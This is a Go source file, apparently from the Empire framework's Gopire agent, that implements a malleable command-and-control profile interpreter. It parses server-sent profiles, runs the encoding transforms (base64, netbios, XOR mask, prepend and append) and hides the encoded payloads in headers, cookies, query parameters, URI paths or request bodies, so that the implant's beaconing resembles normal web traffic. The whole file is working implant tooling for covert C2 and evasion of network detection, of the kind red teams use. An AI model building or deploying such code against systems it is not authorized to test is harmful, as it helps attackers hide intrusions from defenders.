//go:build malleable

package comms

// Runtime malleable C2 profile interpreter for Gopire.
//
// The Empire server serializes a Profile to JSON via
// Profile.serialize_for_agent (see empire/server/common/malleable/profile.py)
// and passes the base64-encoded blob to the agent via the MALLEABLE_PROFILE
// template variable. This file parses the v1 schema, applies/reverses the
// transform pipeline, and stores/extracts data at the terminator location.
//
// The byte-for-byte semantics of every transform mirror the Python
// implementation in empire/server/common/malleable/transformation.py so the
// agent can interoperate with the malleable HTTP listener.

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

// MalleableProfile is the top-level v1 schema emitted by
// Profile.serialize_for_agent. An empty MALLEABLE_PROFILE template var (from
// the plain HTTP listener) is handled by ParseMalleableProfile returning
// (nil, nil), which keeps legacy pipe-split profiles working.
type MalleableProfile struct {
	V        int                `json:"v"`
	Sleep    int                `json:"sleep"`
	Jitter   int                `json:"jitter"`
	Sections map[string]Section `json:"sections"`
}

// Section wraps the client/server halves of a stager/get/post transaction.
type Section struct {
	Client ClientBlock `json:"client"`
	Server ServerBlock `json:"server"`
}

// ClientBlock describes how the agent should construct an outbound request.
// Metadata carries the routing packet (session metadata for get/stager, the
// actual routing packet for post). Output is populated only for the post
// section — in Empire's model the post client can carry both a routing
// packet AND a task-result payload.
//
// Body is base64-encoded bytes — see the note on TransformOp for the
// reason (high-bit bytes in latin-1 profile values lose fidelity if
// shipped as a plain JSON string).
type ClientBlock struct {
	Verb       string            `json:"verb"`
	URIs       []string          `json:"uris"`
	Headers    map[string]string `json:"headers"`
	Parameters map[string]string `json:"parameters"`
	Body       string            `json:"body"` // base64-encoded bytes
	Metadata   *Container        `json:"metadata,omitempty"`
	Output     *Container        `json:"output,omitempty"`
}

// ServerBlock describes how the agent should decode the server's response.
//
// BodyPrefix is base64-encoded bytes (see ClientBlock.Body).
type ServerBlock struct {
	Headers    map[string]string `json:"headers"`
	BodyPrefix string            `json:"body_prefix"` // base64-encoded bytes
	Output     *Container        `json:"output,omitempty"`
}

// Container is a sequence of transforms plus the terminator that specifies
// where the transformed bytes land on the HTTP request/response.
type Container struct {
	Transforms []Transform `json:"transforms"`
	Terminator Terminator  `json:"terminator"`
}

// Transform is a single step in the encoding pipeline. Fields are optional
// depending on Op; unused fields are simply zero-valued.
//
// NOTE: for the prepend / append ops, Value is a base64-encoded byte string
// — NOT a plain JSON string. The Python serializer base64s the raw bytes
// (latin-1 in the Python model) so high-bit bytes survive the JSON UTF-8
// round-trip. Both apply and reverse must decode before concatenating /
// trimming so the byte length matches the Python implementation.
type Transform struct {
	Op    string `json:"op"`
	Value string `json:"value,omitempty"` // prepend / append — base64-encoded bytes
	Key   string `json:"key,omitempty"`   // mask (2-char lowercase hex)
}

// Terminator tells the agent where to stash the transformed payload.
type Terminator struct {
	Type string `json:"type"`
	Arg  string `json:"arg,omitempty"`
}

// ParseMalleableProfile decodes a base64-encoded JSON profile blob. An empty
// or whitespace-only input signals "legacy mode" — return (nil, nil) and let
// the caller fall back to the pipe-split PROFILE var. Malformed base64 or
// JSON yields an error.
func ParseMalleableProfile(b64 string) (*MalleableProfile, error) {
	trimmed := strings.TrimSpace(b64)
	if trimmed == "" {
		return nil, nil
	}
	raw, err := base64.StdEncoding.DecodeString(trimmed)
	if err != nil {
		// Tolerate URL-safe / unpadded encodings too — some template
		// pipelines strip = and swap chars.
		raw, err = base64.RawStdEncoding.DecodeString(trimmed)
		if err != nil {
			return nil, fmt.Errorf("malleable profile: base64 decode failed: %w", err)
		}
	}
	mp := &MalleableProfile{}
	if err := json.Unmarshal(raw, mp); err != nil {
		return nil, fmt.Errorf("malleable profile: json unmarshal failed: %w", err)
	}
	return mp, nil
}

// Apply runs every transform in order over data, returning the final bytes.
// A nil receiver is treated as identity (no transforms, PRINT terminator) so
// callers don't have to null-check.
func (c *Container) Apply(data []byte) ([]byte, error) {
	if c == nil {
		return data, nil
	}
	buf := data
	for _, t := range c.Transforms {
		next, err := applyTransform(buf, t)
		if err != nil {
			return nil, fmt.Errorf("apply %s: %w", t.Op, err)
		}
		buf = next
	}
	return buf, nil
}

// Reverse runs the inverse of each transform in reverse order. It is the
// exact inverse of Apply for round-trip decoding of server responses.
func (c *Container) Reverse(data []byte) ([]byte, error) {
	if c == nil {
		return data, nil
	}
	buf := data
	for i := len(c.Transforms) - 1; i >= 0; i-- {
		t := c.Transforms[i]
		next, err := reverseTransform(buf, t)
		if err != nil {
			return nil, fmt.Errorf("reverse %s: %w", t.Op, err)
		}
		buf = next
	}
	return buf, nil
}

// applyTransform dispatches a single forward transform step.
func applyTransform(data []byte, t Transform) ([]byte, error) {
	switch t.Op {
	case "base64":
		// Python: base64.b64encode(data) — standard padded base64.
		out := base64.StdEncoding.EncodeToString(data)
		return []byte(out), nil
	case "base64url":
		// Python: urllib.parse.quote(base64.b64encode(data)) — standard
		// padded base64 then URL-percent-encode the '+' '/' '=' chars.
		// Using url.QueryEscape would turn '+' into '+' (for spaces) so
		// instead we do explicit percent-encoding of the three special
		// base64 chars so we match Python's quote() default safe set.
		b64 := base64.StdEncoding.EncodeToString(data)
		return []byte(percentEncodeBase64(b64)), nil
	case "netbios":
		return netbiosEncode(data, 'a'), nil
	case "netbiosu":
		return netbiosEncode(data, 'A'), nil
	case "mask":
		key, err := decodeMaskKey(t.Key)
		if err != nil {
			return nil, err
		}
		return xorBytes(data, key), nil
	case "prepend":
		val, err := decodeTransformValue(t.Value)
		if err != nil {
			return nil, err
		}
		return append(val, data...), nil
	case "append":
		val, err := decodeTransformValue(t.Value)
		if err != nil {
			return nil, err
		}
		out := make([]byte, 0, len(data)+len(val))
		out = append(out, data...)
		out = append(out, val...)
		return out, nil
	case "print", "":
		// `print` is an identity transform in the Python generator — the
		// empty op string is defensively mapped here too.
		return data, nil
	default:
		return nil, fmt.Errorf("unknown transform op %q", t.Op)
	}
}

// reverseTransform dispatches a single inverse transform step.
func reverseTransform(data []byte, t Transform) ([]byte, error) {
	switch t.Op {
	case "base64":
		out, err := base64.StdEncoding.DecodeString(string(data))
		if err != nil {
			return nil, err
		}
		return out, nil
	case "base64url":
		// Python reverse: urllib.parse.unquote_to_bytes (which does NOT
		// treat '+' as space — that's urllib.parse.unquote_plus), then
		// pad with '=' to a multiple of 4, then standard b64decode.
		// Go's url.QueryUnescape translates '+' to space and must NOT
		// be used here; PathUnescape matches unquote_to_bytes semantics.
		unq, err := url.PathUnescape(string(data))
		if err != nil {
			return nil, err
		}
		if pad := len(unq) % 4; pad != 0 {
			unq += strings.Repeat("=", 4-pad)
		}
		return base64.StdEncoding.DecodeString(unq)
	case "netbios":
		return netbiosDecode(data, 'a')
	case "netbiosu":
		return netbiosDecode(data, 'A')
	case "mask":
		// XOR is self-inverse.
		key, err := decodeMaskKey(t.Key)
		if err != nil {
			return nil, err
		}
		return xorBytes(data, key), nil
	case "prepend":
		val, err := decodeTransformValue(t.Value)
		if err != nil {
			return nil, err
		}
		if len(data) < len(val) {
			return nil, errors.New("prepend reverse: data shorter than prefix")
		}
		return data[len(val):], nil
	case "append":
		val, err := decodeTransformValue(t.Value)
		if err != nil {
			return nil, err
		}
		if len(data) < len(val) {
			return nil, errors.New("append reverse: data shorter than suffix")
		}
		return data[:len(data)-len(val)], nil
	case "print", "":
		return data, nil
	default:
		return nil, fmt.Errorf("unknown transform op %q", t.Op)
	}
}

// netbiosEncode implements the Python:
//
//	''.join([chr((c >> 4) + base) + chr((c & 0xF) + base) for c in data])
//
// with base='a' for netbios (lowercase) or base='A' for netbiosu.
func netbiosEncode(data []byte, base byte) []byte {
	out := make([]byte, 0, len(data)*2)
	for _, c := range data {
		out = append(out, (c>>4)+base, (c&0x0F)+base)
	}
	return out
}

// netbiosDecode is the inverse of netbiosEncode. Python tolerates odd-length
// input by dropping the tail via range(0, len, 2); we mirror that by
// truncating to the nearest pair.
func netbiosDecode(data []byte, base byte) ([]byte, error) {
	n := len(data) - (len(data) % 2)
	out := make([]byte, 0, n/2)
	for i := 0; i < n; i += 2 {
		hi := data[i] - base
		lo := data[i+1] - base
		out = append(out, (hi<<4)|(lo&0x0F))
	}
	return out, nil
}

// decodeMaskKey parses the 2-char lowercase hex key emitted by the server.
// An empty/malformed key returns an error so the caller can surface the
// mismatch rather than silently corrupting data.
func decodeMaskKey(key string) (byte, error) {
	if len(key) == 0 {
		return 0, errors.New("mask: empty key")
	}
	b, err := hex.DecodeString(key)
	if err != nil {
		return 0, fmt.Errorf("mask: hex decode %q: %w", key, err)
	}
	if len(b) != 1 {
		return 0, fmt.Errorf("mask: key must be exactly 1 byte, got %d", len(b))
	}
	return b[0], nil
}

// decodeTransformValue base64-decodes the Value field of a prepend/append
// Transform. The Python serializer base64s the raw (latin-1) bytes so
// high-bit values like b"\xe9" round-trip through the JSON UTF-8 encoding
// with their original 1-byte length preserved.
//
// An empty Value decodes to an empty byte slice (no-op prepend/append).
func decodeTransformValue(v string) ([]byte, error) {
	if v == "" {
		return []byte{}, nil
	}
	// Tolerate URL-safe / unpadded encodings the same way we do for the
	// outer profile blob — some template pipelines strip padding.
	out, err := base64.StdEncoding.DecodeString(v)
	if err == nil {
		return out, nil
	}
	out, err = base64.RawStdEncoding.DecodeString(v)
	if err != nil {
		return nil, fmt.Errorf("transform value: base64 decode failed: %w", err)
	}
	return out, nil
}

// xorBytes XORs every byte of data with key. Used for the mask transform,
// which is self-inverse.
func xorBytes(data []byte, key byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key
	}
	return out
}

// percentEncodeBase64 percent-encodes only the base64-special chars that
// Python's urllib.parse.quote() touches with its default safe='/' set.
// That means '+' and '=' get encoded, but '/' passes through unchanged.
// Alphanumerics and '_.-~' are also never quoted.
func percentEncodeBase64(s string) string {
	// We know the input alphabet is restricted to A-Za-z0-9+/= so the
	// table below is exhaustive — no need for a general percent-encoder.
	var b strings.Builder
	b.Grow(len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch c {
		case '+':
			b.WriteString("%2B")
		case '=':
			b.WriteString("%3D")
		default:
			b.WriteByte(c)
		}
	}
	return b.String()
}

// StoreTerminator places data on the outgoing request at the location
// specified by term. For HEADER, the value is url-encoded only for Cookie
// headers (mirroring Python's extract path which unquotes any header value
// but only the Cookie header is guaranteed to contain bytes that need
// escaping to survive the cookie parser). Parameters and uri-append are
// always url-encoded so arbitrary bytes survive.
func StoreTerminator(req *http.Request, data []byte, term Terminator) error {
	if req == nil {
		return errors.New("StoreTerminator: nil request")
	}
	switch term.Type {
	case "header":
		if term.Arg == "" {
			return errors.New("header terminator: empty arg")
		}
		val := string(data)
		if strings.EqualFold(term.Arg, "Cookie") {
			// The server's extract uses urllib's unquote_to_bytes which
			// does NOT treat '+' as space. Use PathEscape (encodes space
			// as %20) rather than QueryEscape (which encodes space as +)
			// so the Python side decodes byte-for-byte identically.
			val = url.PathEscape(val)
		}
		req.Header.Set(term.Arg, val)
		return nil
	case "parameter":
		if term.Arg == "" {
			return errors.New("parameter terminator: empty arg")
		}
		q := req.URL.Query()
		q.Set(term.Arg, string(data))
		req.URL.RawQuery = q.Encode()
		return nil
	case "uri-append":
		// Append URL-encoded data to the path. The Python server
		// extracts via unquote_to_bytes (NOT unquote_plus), so use
		// PathEscape to encode spaces as %20 rather than +.
		req.URL.Path += url.PathEscape(string(data))
		return nil
	case "print", "":
		// Store as the request body. Preserves Content-Length handling
		// via the standard library.
		body := io.NopCloser(strings.NewReader(string(data)))
		req.Body = body
		req.ContentLength = int64(len(data))
		// Also set GetBody so redirects work correctly.
		req.GetBody = func() (io.ReadCloser, error) {
			return io.NopCloser(strings.NewReader(string(data))), nil
		}
		return nil
	default:
		return fmt.Errorf("unknown terminator type %q", term.Type)
	}
}

// ExtractTerminator pulls data from the incoming response at the location
// specified by term. URL-decodes headers / parameters / uri-append to match
// Python's MalleableResponse.extract semantics.
//
// registeredURIs is the list of URIs the client declared for this section
// (profile `client.uris`). It is only used for the uri-append case so the
// extractor can strip the longest matching prefix off the response path,
// matching the Python reference at transaction.py:489-497. Callers that
// don't care about uri-append may pass nil.
func ExtractTerminator(resp *http.Response, term Terminator, registeredURIs []string) ([]byte, error) {
	if resp == nil {
		return nil, errors.New("ExtractTerminator: nil response")
	}
	switch term.Type {
	case "header":
		if term.Arg == "" {
			return nil, errors.New("header terminator: empty arg")
		}
		raw := resp.Header.Get(term.Arg)
		if raw == "" {
			return nil, nil
		}
		// PathUnescape matches Python's unquote_to_bytes (NOT unquote_plus);
		// it leaves '+' as a literal rather than turning it into a space.
		unq, err := url.PathUnescape(raw)
		if err != nil {
			// Tolerate header values that aren't URL-encoded.
			return []byte(raw), nil
		}
		return []byte(unq), nil
	case "parameter":
		if term.Arg == "" {
			return nil, errors.New("parameter terminator: empty arg")
		}
		if resp.Request == nil || resp.Request.URL == nil {
			return nil, errors.New("parameter terminator: response has no request URL")
		}
		raw := resp.Request.URL.Query().Get(term.Arg)
		if raw == "" {
			return nil, nil
		}
		// URL.Query() already percent-decodes, so return as-is.
		return []byte(raw), nil
	case "uri-append":
		if resp.Request == nil || resp.Request.URL == nil {
			return nil, errors.New("uri-append terminator: response has no request URL")
		}
		// Python ground truth (transaction.py:489-497): iterate the
		// registered URIs sorted longest-first, find the one that appears
		// in the actual path, and return the suffix AFTER that prefix —
		// NOT the last path segment. For registered "/foo/" and actual
		// "/foo/bar/baz" the returned bytes are "bar/baz".
		path := resp.Request.URL.Path
		// URL-decode the path once — Go's net/url already decodes the path
		// into .Path, but percent-encoded bytes *inside* the appended data
		// stay as literals (e.g. %2F). We run PathUnescape after the prefix
		// split to recover the raw bytes.
		sorted := make([]string, len(registeredURIs))
		copy(sorted, registeredURIs)
		// Descending-by-length sort, stable insertion so we don't pull
		// in sort.Slice for a handful of entries.
		for i := 1; i < len(sorted); i++ {
			for j := i; j > 0 && len(sorted[j]) > len(sorted[j-1]); j-- {
				sorted[j], sorted[j-1] = sorted[j-1], sorted[j]
			}
		}
		for _, known := range sorted {
			if known == "" {
				continue
			}
			lowerPath := strings.ToLower(path)
			lowerKnown := strings.ToLower(known)
			if idx := strings.Index(lowerPath, lowerKnown); idx >= 0 && len(path) > idx+len(known) {
				tail := path[idx+len(known):]
				unq, err := url.PathUnescape(tail)
				if err != nil {
					return []byte(tail), nil
				}
				return []byte(unq), nil
			}
		}
		return nil, errors.New("uri-append terminator: no registered URI matched response path")
	case "print", "":
		if resp.Body == nil {
			return nil, nil
		}
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return nil, err
		}
		return body, nil
	default:
		return nil, fmt.Errorf("unknown terminator type %q", term.Type)
	}
}

// ResolveStagerURIs returns the stage1/stage2 URIs from the profile's stager
// section, falling back to the legacy hardcoded endpoints when no profile is
// present. If the stager client only declared one URI, both stages reuse it.
func ResolveStagerURIs(mp *MalleableProfile) (stage1, stage2 string) {
	if mp == nil {
		return "/stage1", "/stage2"
	}
	stager, ok := mp.Sections["stager"]
	if !ok || len(stager.Client.URIs) == 0 {
		return "/stage1", "/stage2"
	}
	stage1 = stager.Client.URIs[0]
	if len(stager.Client.URIs) >= 2 {
		stage2 = stager.Client.URIs[1]
	} else {
		stage2 = stage1
	}
	return stage1, stage2
}
